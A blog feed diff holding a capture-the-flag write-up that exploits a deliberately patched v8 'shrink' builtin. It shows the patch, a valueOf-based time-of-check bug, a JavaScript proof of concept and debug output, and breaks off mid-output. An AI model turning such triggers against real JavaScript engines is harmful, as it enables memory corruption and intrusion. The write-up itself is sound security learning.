@@ -1,4 +1,645 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="https://zolutal.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://zolutal.github.io/" rel="alternate" type="text/html" /><updated>2025-09-03T23:41:07+00:00</updated><id>https://zolutal.github.io/feed.xml</id><title type="html">zolutal’s blog</title><subtitle>systems hacking</subtitle><author><name>Jennifer Miller</name></author><entry><title type="html">The Joys of Linux Kernel ROP Gadget Scanning</title><link href="https://zolutal.github.io/joys-of-kernel-rop/" rel="alternate" type="text/html" title="The Joys of Linux Kernel ROP Gadget Scanning" /><published>2025-09-03T00:00:00+00:00</published><updated>2025-09-03T00:00:00+00:00</updated><id>https://zolutal.github.io/joys-of-kernel-rop</id><content type="html" xml:base="https://zolutal.github.io/joys-of-kernel-rop/"><![CDATA[<p>Linux Kernel ROP gadget scanning is one of those things that seems easy in theory – just run <code class="language-plaintext highlighter-rouge">ROPgadget --binary vmlinux</code> on it!
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="https://zolutal.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://zolutal.github.io/" rel="alternate" type="text/html" /><updated>2025-10-08T05:54:10+00:00</updated><id>https://zolutal.github.io/feed.xml</id><title type="html">zolutal’s blog</title><subtitle>systems hacking</subtitle><author><name>Jennifer Miller</name></author><entry><title type="html">Securinets Quals 2025: Sukunahikona (v8 Exploitation)</title><link href="https://zolutal.github.io/securinets-sukunahikona/" rel="alternate" type="text/html" title="Securinets Quals 2025: Sukunahikona (v8 Exploitation)" /><published>2025-10-07T00:00:00+00:00</published><updated>2025-10-07T00:00:00+00:00</updated><id>https://zolutal.github.io/securinets-sukunahikona</id><content type="html" xml:base="https://zolutal.github.io/securinets-sukunahikona/"><![CDATA[<p>I played Securinets Quals this weekend with Shellphish, we ended up placing 7th and qualifying for finals! When I logged on to play all of the released pwn was already solved or close to solved by @vy except for the v8 challenge. Despite having never touched v8 pwn before, I decided to give it a go and I managed to solve it. This is my writeup for that challenge :)</p>
+
+<p>Here is the challenge description:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>i ran out of descriptions . Just solve it ig ??!!
+</code></pre></div></div>
+
+<p>Which… wasn’t very helpful.</p>
+
+<p>It came with two files, “to_give.zip” and “patch”:</p>
+<ul>
+  <li><a href="/assets/securinets-sukunahikona/to_give.zip">to_give.zip</a></li>
+  <li><a href="/assets/securinets-sukunahikona/patch">patch</a></li>
+</ul>
+
+<h1 id="getting-started">Getting Started</h1>
+
+<p>Here are the contents of the “to_give.zip” file:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker-compose.yml
+server/d8
+server/args.gn
+server/entrypoint.sh
+server/flag.txt
+server/REVISION
+server/Dockerfile
+server/server.py
+server/snapshot_blob.bin
+</code></pre></div></div>
+
+<p>The most interesting things here is the “d8” binary which is used to run a debug version of v8 called “d8” that lets us access a JavaScript REPL and run JS files. This d8 binary is what the patch file provided with the challenge is applied to and what we need to exploit.</p>
+
+<p>The patch file is a little long just because I think somethine went wrong when the author created it so the diff kind of repeats itself. But when we look at it the first change we see is this:</p>
+
+<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gh">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
+index ea45a7ada6b..2552c286b60 100644
+</span><span class="gd">--- a/src/builtins/builtins-array.cc
+</span><span class="gi">+++ b/src/builtins/builtins-array.cc
+</span><span class="p">@@ -624,6 +624,45 @@</span> BUILTIN(ArrayShift) {
+<span class="err">
+</span>   return GenericArrayShift(isolate, receiver, length);
+ }
+<span class="gi">+BUILTIN(ArrayShrink) {
++  HandleScope scope(isolate);
++  Factory *factory = isolate-&gt;factory();
++  Handle&lt;Object&gt; receiver = args.receiver();
++
++  if (!IsJSArray(*receiver) || !HasOnlySimpleReceiverElements(isolate, Cast&lt;JSArray&gt;(*receiver))) {
++    THROW_NEW_ERROR_RETURN_FAILURE(
++      isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
++      factory-&gt;NewStringFromAsciiChecked("Oldest trick in the book"))
++    );
++  }
++
++  Handle&lt;JSArray&gt; array = Cast&lt;JSArray&gt;(receiver);
++
++  if (args.length() != 2) {
++    THROW_NEW_ERROR_RETURN_FAILURE(
++      isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
++      factory-&gt;NewStringFromAsciiChecked("specify length to shrink to "))
++    );
++  }
++
++
++  uint32_t old_len = static_cast&lt;uint32_t&gt;(Object::NumberValue(array-&gt;length()));
++
++  Handle&lt;Object&gt; new_len_obj;
++  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, new_len_obj, Object::ToNumber(isolate, args.at(1)));
++  uint32_t new_len = static_cast&lt;uint32_t&gt;(Object::NumberValue(*new_len_obj));
++
++  if (new_len &gt;= old_len){
++    THROW_NEW_ERROR_RETURN_FAILURE(
++      isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
++      factory-&gt;NewStringFromAsciiChecked("invalid length"))
++    );
++  }
++
++  array-&gt;set_length(Smi::FromInt(new_len));
++
++  return ReadOnlyRoots(isolate).undefined_value();
++}
+</span></code></pre></div></div>
+
+<p>What this patch does is add an builtin to arrays called “shrink” that takes one argument and resizes the array.
+So you can do something like this:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">arr</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">];</span>
+<span class="nx">arr</span><span class="p">.</span><span class="nf">shrink</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>and this will resize the array to have a length of one.</p>
+
+<p>At first glance this seems fine, but as my teammates @Bena and @elemental had realized, when the shrink function sets the length it doesn’t actually change the number of elements it just updates the length parameter of the JSArray object.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nx">array</span><span class="o">-&gt;</span><span class="nf">set_length</span><span class="p">(</span><span class="nx">Smi</span><span class="p">::</span><span class="nc">FromInt</span><span class="p">(</span><span class="nx">new_len</span><span class="p">));</span> <span class="c1">// this is not correct</span>
+</code></pre></div></div>
+
+<p>But this on it’s own isn’t that interesting, we just can’t access the items beyond the end of the array length even though they still exist.</p>
+
+<p>I learned from my teammates that we can visualize this behavior via the <code class="language-plaintext highlighter-rouge">%DebugPrint()</code> command if we pass <code class="language-plaintext highlighter-rouge">--allow-natives-syntax</code> to the d8 binary:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="o">/</span><span class="nx">d8</span> <span class="o">--</span><span class="nx">allow</span><span class="o">-</span><span class="nx">natives</span><span class="o">-</span><span class="nx">syntax</span>
+<span class="nx">V8</span> <span class="nx">version</span> <span class="mf">12.8</span><span class="p">.</span><span class="mi">0</span> <span class="p">(</span><span class="nx">candidate</span><span class="p">)</span>
+<span class="nx">d8</span><span class="o">&gt;</span> <span class="kd">let</span> <span class="nx">arr</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">];</span>
+<span class="kc">undefined</span>
+<span class="nx">d8</span><span class="o">&gt;</span> <span class="o">%</span><span class="nc">DebugPrint</span><span class="p">(</span><span class="nx">arr</span><span class="p">)</span>
+<span class="nx">DebugPrint</span><span class="p">:</span> <span class="mh">0x80d00042bbd</span><span class="p">:</span> <span class="p">[</span><span class="nx">JSArray</span><span class="p">]</span>
+ <span class="o">-</span> <span class="nx">map</span><span class="p">:</span> <span class="mh">0x080d001caf45</span> <span class="o">&lt;</span><span class="nb">Map</span><span class="p">[</span><span class="mi">16</span><span class="p">](</span><span class="nx">PACKED_SMI_ELEMENTS</span><span class="p">)</span><span class="o">&gt;</span> <span class="p">[</span><span class="nx">FastProperties</span><span class="p">]</span>
+ <span class="o">-</span> <span class="nx">prototype</span><span class="p">:</span> <span class="mh">0x080d001cb1c5</span> <span class="o">&lt;</span><span class="nx">JSArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">&gt;</span>
+ <span class="o">-</span> <span class="nx">elements</span><span class="p">:</span> <span class="mh">0x080d001d3571</span> <span class="o">&lt;</span><span class="nx">FixedArray</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="o">&gt;</span> <span class="p">[</span><span class="nc">PACKED_SMI_ELEMENTS </span><span class="p">(</span><span class="nx">COW</span><span class="p">)]</span>
+ <span class="o">-</span> <span class="nx">length</span><span class="p">:</span> <span class="mi">4</span>
+ <span class="o">-</span> <span class="nx">properties</span><span class="p">:</span> <span class="mh">0x080d00000725</span> <span class="o">&lt;</span><span class="nx">FixedArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">&gt;</span>
+ <span class="o">-</span> <span class="nx">All</span> <span class="nx">own</span> <span class="nf">properties </span><span class="p">(</span><span class="nx">excluding</span> <span class="nx">elements</span><span class="p">):</span> <span class="p">{</span>
+    <span class="mh">0x80d00000d99</span><span class="p">:</span> <span class="p">[</span><span class="nb">String</span><span class="p">]</span> <span class="k">in</span> <span class="nx">ReadOnlySpace</span><span class="p">:</span> <span class="err">#</span><span class="nx">length</span><span class="p">:</span> <span class="mh">0x080d00025fed</span> <span class="o">&lt;</span><span class="nx">AccessorInfo</span> <span class="nx">name</span><span class="o">=</span> <span class="mh">0x080d00000d99</span> <span class="o">&lt;</span><span class="nb">String</span><span class="p">[</span><span class="mi">6</span><span class="p">]:</span> <span class="err">#</span><span class="nx">length</span><span class="o">&gt;</span><span class="p">,</span> <span class="nx">data</span><span class="o">=</span> <span class="mh">0x080d00000069</span> <span class="o">&lt;</span><span class="kc">undefined</span><span class="o">&gt;&gt;</span> <span class="p">(</span><span class="kd">const</span> <span class="nx">accessor</span> <span class="nx">descriptor</span><span class="p">,</span> <span class="nx">attrs</span><span class="p">:</span> <span class="p">[</span><span class="nx">W__</span><span class="p">]),</span> <span class="nx">location</span><span class="p">:</span> <span class="nx">descriptor</span>
+ <span class="p">}</span>
+ <span class="o">-</span> <span class="nx">elements</span><span class="p">:</span> <span class="mh">0x080d001d3571</span> <span class="o">&lt;</span><span class="nx">FixedArray</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="o">&gt;</span> <span class="p">{</span>
+           <span class="mi">0</span><span class="p">:</span> <span class="mi">1</span>
+           <span class="mi">1</span><span class="p">:</span> <span class="mi">2</span>
+           <span class="mi">2</span><span class="p">:</span> <span class="mi">3</span>
+           <span class="mi">3</span><span class="p">:</span> <span class="mi">4</span>
+ <span class="p">}</span>
+<span class="p">...</span>
+<span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">]</span>
+<span class="nx">d8</span><span class="o">&gt;</span> <span class="nx">arr</span><span class="p">.</span><span class="nf">shrink</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="kc">undefined</span>
+<span class="nx">d8</span><span class="o">&gt;</span> <span class="o">%</span><span class="nc">DebugPrint</span><span class="p">(</span><span class="nx">arr</span><span class="p">)</span>
+<span class="nx">DebugPrint</span><span class="p">:</span> <span class="mh">0x80d00042bbd</span><span class="p">:</span> <span class="p">[</span><span class="nx">JSArray</span><span class="p">]</span>
+ <span class="o">-</span> <span class="nx">map</span><span class="p">:</span> <span class="mh">0x080d001caf45</span> <span class="o">&lt;</span><span class="nb">Map</span><span class="p">[</span><span class="mi">16</span><span class="p">](</span><span class="nx">PACKED_SMI_ELEMENTS</span><span class="p">)</span><span class="o">&gt;</span> <span class="p">[</span><span class="nx">FastProperties</span><span class="p">]</span>
+ <span class="o">-</span> <span class="nx">prototype</span><span class="p">:</span> <span class="mh">0x080d001cb1c5</span> <span class="o">&lt;</span><span class="nx">JSArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">&gt;</span>
+ <span class="o">-</span> <span class="nx">elements</span><span class="p">:</span> <span class="mh">0x080d001d3571</span> <span class="o">&lt;</span><span class="nx">FixedArray</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="o">&gt;</span> <span class="p">[</span><span class="nc">PACKED_SMI_ELEMENTS </span><span class="p">(</span><span class="nx">COW</span><span class="p">)]</span>
+ <span class="o">-</span> <span class="nx">length</span><span class="p">:</span> <span class="mi">1</span>     <span class="o">&lt;--------</span> <span class="nx">LENGTH</span> <span class="nx">IS</span> <span class="nx">NOW</span> <span class="nx">ONE</span>
+ <span class="o">-</span> <span class="nx">properties</span><span class="p">:</span> <span class="mh">0x080d00000725</span> <span class="o">&lt;</span><span class="nx">FixedArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">&gt;</span>
+ <span class="o">-</span> <span class="nx">All</span> <span class="nx">own</span> <span class="nf">properties </span><span class="p">(</span><span class="nx">excluding</span> <span class="nx">elements</span><span class="p">):</span> <span class="p">{</span>
+    <span class="mh">0x80d00000d99</span><span class="p">:</span> <span class="p">[</span><span class="nb">String</span><span class="p">]</span> <span class="k">in</span> <span class="nx">ReadOnlySpace</span><span class="p">:</span> <span class="err">#</span><span class="nx">length</span><span class="p">:</span> <span class="mh">0x080d00025fed</span> <span class="o">&lt;</span><span class="nx">AccessorInfo</span> <span class="nx">name</span><span class="o">=</span> <span class="mh">0x080d00000d99</span> <span class="o">&lt;</span><span class="nb">String</span><span class="p">[</span><span class="mi">6</span><span class="p">]:</span> <span class="err">#</span><span class="nx">length</span><span class="o">&gt;</span><span class="p">,</span> <span class="nx">data</span><span class="o">=</span> <span class="mh">0x080d00000069</span> <span class="o">&lt;</span><span class="kc">undefined</span><span class="o">&gt;&gt;</span> <span class="p">(</span><span class="kd">const</span> <span class="nx">accessor</span> <span class="nx">descriptor</span><span class="p">,</span> <span class="nx">attrs</span><span class="p">:</span> <span class="p">[</span><span class="nx">W__</span><span class="p">]),</span> <span class="nx">location</span><span class="p">:</span> <span class="nx">descriptor</span>
+ <span class="p">}</span>
+ <span class="o">-</span> <span class="nx">elements</span><span class="p">:</span> <span class="mh">0x080d001d3571</span> <span class="o">&lt;</span><span class="nx">FixedArray</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="o">&gt;</span> <span class="p">{</span>  <span class="o">&lt;-------</span> <span class="nx">NUMBER</span> <span class="nx">OF</span> <span class="nx">ELEMENTS</span> <span class="nx">IS</span> <span class="nx">jSTILL</span> <span class="nx">FOUR</span>
+           <span class="mi">0</span><span class="p">:</span> <span class="mi">1</span>
+           <span class="mi">1</span><span class="p">:</span> <span class="mi">2</span>
+           <span class="mi">2</span><span class="p">:</span> <span class="mi">3</span>
+           <span class="mi">3</span><span class="p">:</span> <span class="mi">4</span>
+ <span class="p">}</span>
+<span class="p">...</span>
+<span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="nx">d8</span><span class="o">&gt;</span> <span class="nx">arr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="kc">undefined</span>
+</code></pre></div></div>
+
+<p>At this point we were thinking it might be possible that the garbage collector could free these objects and we could somehow get UAF on them, and maybe there were other methods in v8 that operate on the number of elements rather than the length of the array. But it seemed like they wouldn’t be garbage collected because they were still referenced in elements array on the JSArray object.</p>
+
+<h1 id="searching-for-clues">Searching for Clues</h1>
+
+<p>I was pretty lost on how else this might be vulnerable at so I went searching for other writeups to see if I could find anything and stumbled across a writeup for a similar challenge: <a href="https://lyra.horse/blog/2024/05/exploiting-v8-at-openecsc/">https://lyra.horse/blog/2024/05/exploiting-v8-at-openecsc/</a>.</p>
+
+<p>Here is the patch for that challenge:</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BUILTIN</span><span class="p">(</span><span class="n">ArrayXor</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">HandleScope</span> <span class="n">scope</span><span class="p">(</span><span class="n">isolate</span><span class="p">);</span>
+  <span class="n">Factory</span> <span class="o">*</span><span class="n">factory</span> <span class="o">=</span> <span class="n">isolate</span><span class="o">-&gt;</span><span class="n">factory</span><span class="p">();</span>
+  <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">receiver</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">receiver</span><span class="p">();</span>
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">IsJSArray</span><span class="p">(</span><span class="o">*</span><span class="n">receiver</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="n">HasOnlySimpleReceiverElements</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">JSArray</span><span class="o">::</span><span class="n">cast</span><span class="p">(</span><span class="o">*</span><span class="n">receiver</span><span class="p">)))</span> <span class="p">{</span>
+    <span class="n">THROW_NEW_ERROR_RETURN_FAILURE</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">NewTypeError</span><span class="p">(</span><span class="n">MessageTemplate</span><span class="o">::</span><span class="n">kPlaceholderOnly</span><span class="p">,</span>
+      <span class="n">factory</span><span class="o">-&gt;</span><span class="n">NewStringFromAsciiChecked</span><span class="p">(</span><span class="s">"Nope"</span><span class="p">)));</span>
+  <span class="p">}</span>
+  <span class="n">Handle</span><span class="o">&lt;</span><span class="n">JSArray</span><span class="o">&gt;</span> <span class="n">array</span> <span class="o">=</span> <span class="n">Handle</span><span class="o">&lt;</span><span class="n">JSArray</span><span class="o">&gt;::</span><span class="n">cast</span><span class="p">(</span><span class="n">receiver</span><span class="p">);</span>
+  <span class="n">ElementsKind</span> <span class="n">kind</span> <span class="o">=</span> <span class="n">array</span><span class="o">-&gt;</span><span class="n">GetElementsKind</span><span class="p">();</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">kind</span> <span class="o">!=</span> <span class="n">PACKED_DOUBLE_ELEMENTS</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">THROW_NEW_ERROR_RETURN_FAILURE</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">NewTypeError</span><span class="p">(</span><span class="n">MessageTemplate</span><span class="o">::</span><span class="n">kPlaceholderOnly</span><span class="p">,</span>
+      <span class="n">factory</span><span class="o">-&gt;</span><span class="n">NewStringFromAsciiChecked</span><span class="p">(</span><span class="s">"Array.xor needs array of double numbers"</span><span class="p">)));</span>
+  <span class="p">}</span>
+  <span class="c1">// Array.xor() needs exactly 1 argument</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">length</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">THROW_NEW_ERROR_RETURN_FAILURE</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">NewTypeError</span><span class="p">(</span><span class="n">MessageTemplate</span><span class="o">::</span><span class="n">kPlaceholderOnly</span><span class="p">,</span>
+      <span class="n">factory</span><span class="o">-&gt;</span><span class="n">NewStringFromAsciiChecked</span><span class="p">(</span><span class="s">"Array.xor needs exactly one argument"</span><span class="p">)));</span>
+  <span class="p">}</span>
+  <span class="c1">// Get array len</span>
+  <span class="kt">uint32_t</span> <span class="n">length</span> <span class="o">=</span> <span class="k">static_cast</span><span class="o">&lt;</span><span class="kt">uint32_t</span><span class="o">&gt;</span><span class="p">(</span><span class="n">Object</span><span class="o">::</span><span class="n">Number</span><span class="p">(</span><span class="n">array</span><span class="o">-&gt;</span><span class="n">length</span><span class="p">()));</span>
+  <span class="c1">// Get xor value</span>
+  <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">xor_val_obj</span><span class="p">;</span>
+  <span class="n">ASSIGN_RETURN_FAILURE_ON_EXCEPTION</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">xor_val_obj</span><span class="p">,</span> <span class="n">Object</span><span class="o">::</span><span class="n">ToNumber</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">at</span><span class="p">(</span><span class="mi">1</span><span class="p">)));</span>
+  <span class="kt">uint64_t</span> <span class="n">xor_val</span> <span class="o">=</span> <span class="k">static_cast</span><span class="o">&lt;</span><span class="kt">uint64_t</span><span class="o">&gt;</span><span class="p">(</span><span class="n">Object</span><span class="o">::</span><span class="n">Number</span><span class="p">(</span><span class="o">*</span><span class="n">xor_val_obj</span><span class="p">));</span>
+  <span class="c1">// Ah yes, xoring doubles..</span>
+  <span class="n">Handle</span><span class="o">&lt;</span><span class="n">FixedDoubleArray</span><span class="o">&gt;</span> <span class="n">elements</span><span class="p">(</span><span class="n">FixedDoubleArray</span><span class="o">::</span><span class="n">cast</span><span class="p">(</span><span class="n">array</span><span class="o">-&gt;</span><span class="n">elements</span><span class="p">()),</span> <span class="n">isolate</span><span class="p">);</span>
+  <span class="n">FOR_WITH_HANDLE_SCOPE</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="kt">uint32_t</span><span class="p">,</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">length</span><span class="p">,</span> <span class="n">i</span><span class="o">++</span><span class="p">,</span> <span class="p">{</span>
+    <span class="kt">double</span> <span class="n">x</span> <span class="o">=</span> <span class="n">elements</span><span class="o">-&gt;</span><span class="n">get_scalar</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
+    <span class="kt">uint64_t</span> <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">x</span><span class="p">)</span> <span class="o">^</span> <span class="n">xor_val</span><span class="p">;</span>
+    <span class="n">elements</span><span class="o">-&gt;</span><span class="n">set</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="kt">double</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">result</span><span class="p">);</span>
+  <span class="p">});</span>
+
+  <span class="k">return</span> <span class="nf">ReadOnlyRoots</span><span class="p">(</span><span class="n">isolate</span><span class="p">).</span><span class="n">undefined_value</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>This is very similar, it does the same kind of checks to make sure the builtin is being called on a JSArray and then casts the argument to a Number type. The author of this writeup exploits a TOCTOU this code by setting a ‘valueOf’ property on a Map type:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">evil</span> <span class="o">=</span> <span class="p">{</span>
+     <span class="na">valueOf</span><span class="p">:</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+       <span class="nx">arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">{};</span>
+       <span class="k">return</span> <span class="mi">1337</span><span class="p">;</span>
+     <span class="p">}</span>
+   <span class="p">}</span>
+</code></pre></div></div>
+
+<p>This allows her to modify the array the builtin is called on after the code checks that the array only contains doubles and get it to do the xor operation on a map object, corrupting the pointer to the object.</p>
+
+<h1 id="snap-back-to-reality">Snap Back to Reality</h1>
+
+<p>Now, back to the challenge we are working on, it turns out we can do something pretty similar:</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="c1">// read length of array</span>
+  <span class="kt">uint32_t</span> <span class="n">old_len</span> <span class="o">=</span> <span class="k">static_cast</span><span class="o">&lt;</span><span class="kt">uint32_t</span><span class="o">&gt;</span><span class="p">(</span><span class="n">Object</span><span class="o">::</span><span class="n">NumberValue</span><span class="p">(</span><span class="n">array</span><span class="o">-&gt;</span><span class="n">length</span><span class="p">()));</span>
+
+  <span class="c1">// argument is casted to a number type, we can remove elements in a valueOf method from the array and still return whatever length we want new_len to be</span>
+  <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">new_len_obj</span><span class="p">;</span>
+  <span class="n">ASSIGN_RETURN_FAILURE_ON_EXCEPTION</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">new_len_obj</span><span class="p">,</span> <span class="n">Object</span><span class="o">::</span><span class="n">ToNumber</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">at</span><span class="p">(</span><span class="mi">1</span><span class="p">)));</span>
+  <span class="kt">uint32_t</span> <span class="n">new_len</span> <span class="o">=</span> <span class="k">static_cast</span><span class="o">&lt;</span><span class="kt">uint32_t</span><span class="o">&gt;</span><span class="p">(</span><span class="n">Object</span><span class="o">::</span><span class="n">NumberValue</span><span class="p">(</span><span class="o">*</span><span class="n">new_len_obj</span><span class="p">));</span>
+
+  <span class="c1">// checks against old_len which was read before we modified the array in the valueOf method</span>
+  <span class="c1">// if we remove all elements from the array but then return new_len as old_len-1 we still pass this check</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">new_len</span> <span class="o">&gt;=</span> <span class="n">old_len</span><span class="p">){</span>
+    <span class="n">THROW_NEW_ERROR_RETURN_FAILURE</span><span class="p">(</span>
+      <span class="n">isolate</span><span class="p">,</span> <span class="n">NewTypeError</span><span class="p">(</span><span class="n">MessageTemplate</span><span class="o">::</span><span class="n">kPlaceholderOnly</span><span class="p">,</span>
+      <span class="n">factory</span><span class="o">-&gt;</span><span class="n">NewStringFromAsciiChecked</span><span class="p">(</span><span class="s">"invalid length"</span><span class="p">))</span>
+    <span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="n">array</span><span class="o">-&gt;</span><span class="n">set_length</span><span class="p">(</span><span class="n">Smi</span><span class="o">::</span><span class="n">FromInt</span><span class="p">(</span><span class="n">new_len</span><span class="p">));</span>
+</code></pre></div></div>
+
+<p>Here is a small PoC I used to demonstrate it was possible to trigger this bug:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">arr</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Array</span><span class="p">(</span><span class="mi">2000</span><span class="p">).</span><span class="nf">fill</span><span class="p">({});</span>
+<span class="nx">evil</span> <span class="o">=</span> <span class="p">{</span> <span class="nf">valueOf</span><span class="p">()</span> <span class="p">{</span> <span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1999</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> <span class="nx">arr</span><span class="p">.</span><span class="nf">pop</span><span class="p">();</span> <span class="p">}</span> <span class="k">return</span> <span class="mi">1999</span><span class="p">;</span> <span class="p">}</span> <span class="p">};</span>
+<span class="nx">arr</span><span class="p">.</span><span class="nf">shrink</span><span class="p">(</span><span class="nx">evil</span><span class="p">)</span>
+<span class="o">%</span><span class="nc">DebugPrint</span><span class="p">(</span><span class="nx">arr</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>This is the output:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">DebugPrint</span><span class="p">:</span> <span class="mh">0x4ec00042bb9</span><span class="p">:</span> <span class="p">[</span><span class="nx">JSArray</span><span class="p">]</span>
+ <span class="o">-</span> <span class="nx">map</span><span class="p">:</span> <span class="mh">0x04ec001cb92d</span> <span class="o">&lt;</span><span class="nb">Map</span><span class="p">[</span><span class="mi">16</span><span class="p">](</span><span class="nx">HOLEY_ELEMENTS</span><span class="p">)</span><span class="o">&gt;</span> <span class="p">[</span><span class="nx">FastProperties</span><span class="p">]</span>
+ <span class="o">-</span> <span class="nx">prototype</span><span class="p">:</span> <span class="mh">0x04ec001cb1c5</span> <span class="o">&lt;</span><span class="nx">JSArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">&gt;</span>
+ <span class="o">-</span> <span class="nx">elements</span><span class="p">:</span> <span class="mh">0x04ec00042bc9</span> <span class="o">&lt;</span><span class="nx">FixedArray</span><span class="p">[</span><span class="mi">18</span><span class="p">]</span><span class="o">&gt;</span> <span class="p">[</span><span class="nx">HOLEY_ELEMENTS</span><span class="p">]</span>
+ <span class="o">-</span> <span class="nx">length</span><span class="p">:</span> <span class="mi">1999</span>
+ <span class="o">-</span> <span class="nx">properties</span><span class="p">:</span> <span class="mh">0x04ec00000725</span> <span class="o">&lt;</span><span class="nx">FixedArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">&gt;</span>
+ <span class="o">-</span> <span class="nx">All</span> <span class="nx">own</span> <span class="nf">properties </span><span class="p">(</span><span class="nx">excluding</span> <span class="nx">elements</span><span class="p">):</span> <span class="p">{</span>
